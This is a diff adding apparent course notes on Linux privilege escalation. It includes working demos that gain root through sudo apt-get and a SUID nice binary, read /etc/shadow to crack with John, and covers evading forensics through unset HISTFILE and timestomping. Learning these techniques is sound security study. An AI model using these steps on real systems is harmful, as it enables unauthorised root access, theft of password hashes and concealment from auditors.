@@ -1,0 +1,140 @@
+  sudo 
+sudo -l 
+sudo file
+
+suid/sgid
+with this set, allows you to run something as the owner of the file or the group owner of the file
+
+suid bit:
+find / -type f -perm /4000 -ls 2>/dev/null
+
+sgid bit
+find / -type f -perm /2000 -ls 2>/dev/null
+
+BOTH suid and sgid
+find / -type f -perm /6000 -ls 2>/dev/null
+
+    insecure permissions
+cron
+  crontab -l -lists jobs
+  crontab -e -edits jobs
+  crontab -r -removes jobs
+  crontab -u -specifies a specific users crontab
+
+  user created (including root, if making for itself) - /var/spool/cron/crontab
+  system level - /etc/crontab
+
+  crontab.guru
+
+world writable files/folders
+  /tmp
+  /var/tmp
+
+  find world writable directories
+  find / -type d -perm /2 -ls 2>/dev/null
+
+  find directories that current user is able to write to
+  find / -type f -writable -o -type d -writable -ls 2>/dev/null
+
+
+dot "." in PATH
+  system uses PATH variable to locate commands, if ".:/home/stu..." then if a command is located in present directory, it will be the one that is run instead of the intended or anticpated command 
+
+  echo $PATH to see if there is a dot "." in the PATH variable
+  changing into a different directory will solve this issue
+
+
+
+persistance 
+
+adding or hijacking a user account
+
+
+
+aritfacts
+lsoft command
+
+unset HISTFILE
+
+be aware of init system in use =
+ps -p 1
+
+int = systemv
+systemd = systemd
+
+init --version
+
+journalctl -audit logs
+
+auth.log/secure  Logins/authentications
+
+lastlog          Each users' last successful login time
+
+btmp             Bad login attempts
+
+sulog            Usage of SU command
+
+utmp             Currently logged in users (W command)
+
+wtmp             Permanent record on user on/off
+
+  Working With Logs
+file /var/log/wtmp
+find /var/log -type f -mmin -10 2> /dev/null
+journalctl -f -u ssh
+journalctl -q SYSLOG_FACILITY=10 SYSLOG_FACILITY=4
+
+clearing logs ----- go over
+
+timestomp
+touch -c -t -specify date you want to change timestamp to (all 0s for milliseconds, not good)
+touch -r  -use another files date as reference (better)
+
+remote logging
+/etc/rsyslog.conf  /  /etc/rsyslog.d/*
+Reading Rsyslog
+<facility>.<priority>
+ 
+grep "IncludeConfig" /etc/rsyslog.conf
+
+-----------------demo---------------------
+sudo -l
+result: /usr/bin/apt-get
+gtfo-bin -> apt-get
+sudo apt-get changelog apt
+!/bin/bash
+id
+result: root
+
+
+sudo -l
+result: /bin/cat /var/log/syslog*
+ls -l /var/log/syslog*
+sudo cat /var/log/syslog /etc/shadow
+result: <contents of /etc/shadow>
+john file----
+
+
+find / -type f -perm /6000 -ls 2>/dev/null
+###start at first line and work down
+.
+result : /usr/bin/cat & /usr/bin/nice
+cat /etc/shadow - WIN
+
+gtfo-bin -> nice
+#ignore install and ./ (just run command as a normal command)
+nice /bin/sh -p
+id
+result:
+uid = user euid = root
+
+
+
+
+
+
+
+
+
+
+
